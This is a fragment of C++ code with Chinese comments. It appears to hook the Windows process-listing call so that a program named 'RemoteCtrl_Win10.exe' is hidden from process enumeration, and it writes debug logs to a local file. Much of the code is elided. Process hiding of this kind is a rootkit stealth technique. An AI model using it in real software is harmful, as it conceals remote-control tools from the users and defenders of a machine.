...
)
{
	...
	// 要隐藏的进程PID
	DWORD dwHideProcessId = 18320;
	// wchar_t dwHideProcessName1[MAX_PATH] = L"main.exe";
	wchar_t dwHideProcessName2[MAX_PATH] = L"RemoteCtrl_Win10.exe";
	...
	if (NT_SUCCESS(status) && 5 == SystemInformationClass)
	{
		...
		std::fstream file("G:\\log.txt", std::ofstream::app);
		while (TRUE)
		{
			// 判断是否是要隐藏的进程PID
			if (lstrcmp((LPCSTR)pCur->ImageName.Buffer, (LPCSTR)dwHideProcessName2) == 0)
			{
				file << "Detect one!\nBefore:";
				file << (pPrev->NextEntryOffset) << "\n";
			...
			{
				file << pCur->ImageName.Buffer << std::endl;
				pPrev = pCur;
			}
